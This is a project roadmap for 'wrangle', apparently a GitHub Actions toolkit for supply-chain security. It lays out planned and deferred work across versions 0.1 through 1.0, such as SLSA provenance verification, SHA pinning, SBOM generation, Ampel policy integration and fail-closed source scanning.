## Roadmap

### v0.1.0 — Source scanning + container build (this spec)

**Source stage:**
- [ ] Per-tool directories (`tools/<name>/`) with adapter + install + test
- [ ] Binary download with SLSA provenance (preferred) or SHA-256 verification
- [ ] Shared download/verify library (`lib/download_verify.sh`)
- [ ] Portable composite action (`github.action_path`)
- [ ] Input validation and environment isolation in orchestrator
- [ ] SARIF upload enabled (per-tool categories)
- [ ] Output sanitization for step summaries

**Build/publish stage (container):**
- [ ] Container build action portability fixes (`${{ github.action_path }}`)
- [ ] Container build action security fixes (PATH clobbering, expression injection)
- [ ] SBOM generation + vulnerability scanning working cross-repo

**Infrastructure:**
- [ ] All action references pinned to SHAs
- [ ] SLSA source track adopted for the wrangle repo itself
- [ ] Testing infrastructure (actionlint + shellcheck + bats)
- [ ] Tested on Concordance
- [ ] AGENTS.md for AI agent adoption

### v0.2.0 — Verify story complete + Go hardening + tool plumbing

Theme: complete the verify story end-to-end (producer + consumer), harden
the Go build type, and tighten tool plumbing. Go, Python, and npm build
types have all landed on `main` (Go in [#238](https://github.com/TomHennen/wrangle/pull/238))
and will ship in the v0.2.0 tag — example workflows in `gh_workflow_examples/`
already pin `@v0.2.0` in anticipation. v0.2 owns hardening and additional
shapes for those build types, not net-new ecosystems. "Verify story complete"
for the v0.2 cut means at least one build type wired end-to-end through
Ampel (#247) plus the consumer-facing verify action (#198) shipped — not
every Ampel phase in #247.

A profile system (`wrangle.yml` with `profile:` field) and a `wrangle init`
bootstrapper were considered and deferred — the existing example workflows
in `gh_workflow_examples/` already deliver the "one-shot adoption" vision,
and a config layer doesn't reduce the irreducible per-adopter inputs
(`path`, `imagename`, `release-events`).

- [ ] Go build type follow-ups: validation-only sub-shape ([#239](https://github.com/TomHennen/wrangle/issues/239)), PR-build cost knob ([#245](https://github.com/TomHennen/wrangle/issues/245)), `govulncheck-version` input ([#246](https://github.com/TomHennen/wrangle/issues/246)), Go workflow reliability ([#254](https://github.com/TomHennen/wrangle/issues/254)), cgo + multi-arch goreleaser ([#259](https://github.com/TomHennen/wrangle/issues/259))
- [ ] [Ampel](https://github.com/carabiner-dev/ampel) integration — policy
      verification layer that evaluates attestations against CEL-based
      policies and produces Verification Summary Attestations. Scoping in
      [`docs/ampel_research.md`](./ampel_research.md) and
      [#247](https://github.com/TomHennen/wrangle/issues/247); each phase
      lands as a PR referencing #247. Known limitation: Phases 1–7 keep the build
      workflow and the verifier in the same GitHub Actions job, which is
      not strictly SLSA L3-compliant for builder/verifier separation. A
      separate verifier service (Option C in the scoping doc) is a
      post-v1.0 work item.
- [ ] Adopter-side `verify-artifact` action — closes the runner-isolation gap between wrangle's `verify` job and the adopter's publish job (today each download is independent, so the publish job has no machine-checked guarantee its bytes match the attestation). Verifies whatever the build produced (SLSA provenance or VSA) — not tied to Ampel. Downstream-consumer verification is covered by upstream `slsa-verifier` plus a docs page, not a wrapper. Tracking: [#198](https://github.com/TomHennen/wrangle/issues/198) (to be rescoped to adopter-side surface only).
- [ ] Bundle wrangle attestations into a single in-toto JSONL across all build types (replacing per-build `python-<shortname>.intoto.jsonl` etc.). Tracking: [#181](https://github.com/TomHennen/wrangle/issues/181)
- [ ] Action-pattern source-scan tools must fail closed when the underlying tool errors (currently fail open). Tracking: [#222](https://github.com/TomHennen/wrangle/issues/222)
- [ ] Fix wrangle's own SLSA Source Track integration (prerequisite). Tracking: [#174](https://github.com/TomHennen/wrangle/issues/174)
- [ ] Help adopters adopt the SLSA source track in their repos via `check_source_change.yml`. Tracking: [#201](https://github.com/TomHennen/wrangle/issues/201)

**Deferred from v0.2** (candidates for v0.3+):

- Profile system and `wrangle init` — see theme paragraph above. Tracking: [#265](https://github.com/TomHennen/wrangle/issues/265)
- Lightweight adapter sandboxing (bubblewrap/firejail on Linux) — significant design surface; own release. Tracking: [#267](https://github.com/TomHennen/wrangle/issues/267)
- Additional source tools (Semgrep, Trivy) — additive, not architectural. Tracking: [#268](https://github.com/TomHennen/wrangle/issues/268)
- `tools.lock` manifest — single file listing all tool versions/URLs/checksums per platform. Marginal value at current tool count (small fixed set, infrequent bumps, atomic per-`install.sh` checksums already work). Tracking: [#264](https://github.com/TomHennen/wrangle/issues/264)
- Per-tool configuration — prefer native config files over flat passthrough inputs. Tracking: [#221](https://github.com/TomHennen/wrangle/issues/221)
- Test integration as a profile-level concept — each build type already runs tests inside its own action
- npm/pnpm/yarn workspaces ([#208](https://github.com/TomHennen/wrangle/issues/208)) — own track

### v1.0.0 — OpenSSF ready

- [ ] OpenSSF contribution proposal
- [ ] Stable adapter API with versioning guarantees
- [ ] Multi-CI support (GitLab, etc.)
- [ ] Full lifecycle coverage for all major project types
